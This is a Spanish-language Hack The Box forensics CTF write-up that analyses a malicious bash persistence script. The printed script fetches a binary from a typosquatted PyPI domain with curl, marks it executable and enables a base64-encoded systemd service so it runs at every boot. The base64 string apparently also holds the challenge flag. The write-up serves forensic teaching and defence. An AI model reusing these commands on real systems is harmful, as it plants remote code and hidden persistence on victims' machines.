---
title: "Extraterrestrial Persistence"
description: "Writeup de Extraterrestrial Persistence - Hack The Box - Forensics 100pts. Script bash malicioso en zip; instala servicio systemd desde string base64 inline; la flag aparece en el campo Description de la unit file decodificada."
sidebar:
  badge:
    text: Forensics
    variant: note
tags:
  - htb
  - forensics
  - bash
  - systemd
  - persistence
  - base64
  - static-analysis
  - linux
---

# Extraterrestrial Persistence

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Forensics
> 🏆 Puntos: 100
> 👤 Autor: warrior866

---

## Descripción

Se proporciona un ZIP protegido con contraseña que contiene `persistence.sh`, un script bash de persistencia maliciosa. El script comprueba que se está ejecutando en un host específico (usuario `pandora`, hostname `linux_HQ`), descarga un binario desde un dominio falso de PyPI, y crea un servicio systemd para persistencia. La unit file del servicio se genera decodificando un string base64 embebido en el propio script — y ese string contiene la flag en su campo `Description`.

---

## Extracción y análisis inicial

```bash
unzip a12c7339-27d8-4829-91da-9941691cfe96.zip -d "Extraterrestrial-Persistence"
# Password: hackthebox
cd "Extraterrestrial-Persistence"

file persistence.sh
# persistence.sh: ASCII text, with very long lines (396), with CRLF line terminators
```

---

## Análisis del script

```bash
cat persistence.sh
```

El script tiene varias secciones clave:

```bash
n=`whoami`
h=`hostname`
path='/usr/local/bin/service'

# 1. Solo se ejecuta si el usuario es pandora en host linux_HQ
if [[ "$n" != "pandora" && "$h" != "linux_HQ" ]]; then exit; fi

# 2. Descarga el binario del miner desde un dominio falso de PyPI
curl https://files.pypi-install.com/packeges/service -o $path
chmod +x $path

# 3. Crea el archivo de servicio systemd decodificando un string base64
echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30K..." \
    | base64 --decode > /usr/lib/systemd/system/service.service

# 4. Habilita el servicio para persistencia en el arranque
systemctl enable service.service
```

El dominio `files.pypi-install.com` es un typosquatting de PyPI (Python Package Index) — una táctica común en supply chain attacks.

---

## Decodificación de la unit file

La clave es el string base64 que se escribe como archivo de servicio:

```bash
echo "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA==" | base64 -d
```

```ini
[Unit]
Description=HTB{FLAG}
After=network.target network-online.target

[Service]
Type=oneshot
RemainAfterExit=yes

ExecStart=/usr/local/bin/service
ExecStop=/usr/local/bin/service

[Install]
WantedBy=multi-user.target
```

La flag está en el campo `Description` de la unit file de systemd.

---

## Cadena de Ataque (perspectiva del atacante)

```text
1. Víctima ejecuta persistence.sh (p.ej. tras explotar un servicio expuesto)
       ↓
2. Script verifica: whoami==pandora && hostname==linux_HQ → continúa
       ↓
3. Descarga /usr/local/bin/service desde fake PyPI domain
       ↓
4. Decodifica base64 inline → crea /usr/lib/systemd/system/service.service
       ↓
5. systemctl enable → el binario se ejecuta en cada arranque (persistencia)
```

---

## Lecciones Aprendidas

- **Typosquatting de repositorios**: `files.pypi-install.com` imita a PyPI para distribuir malware. Siempre verificar la URL exacta de los paquetes descargados.
- **Base64 en scripts**: los atacantes embeben payloads en base64 para ocultar el contenido a revisiones superficiales. Buscar siempre strings que contengan `base64 --decode` o `base64 -d`.
- **Systemd como vector de persistencia**: crear servicios en `/usr/lib/systemd/system/` y habilitarlos garantiza ejecución en cada arranque. Los defensores deben auditar los servicios habilitados en el sistema.
- **Verificación de entorno objetivo**: el script verifica usuario y hostname antes de ejecutarse — técnica de evasión para evitar análisis en sandboxes que no reproduzcan el entorno exacto.

---

## Referencias

- [Systemd service unit reference](https://www.freedesktop.org/software/systemd/man/systemd.service.html)
- [HackTricks — Linux Persistence](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-persistence)
- [PyPI Typosquatting](https://jfrog.com/blog/python-supply-chain-attack/)
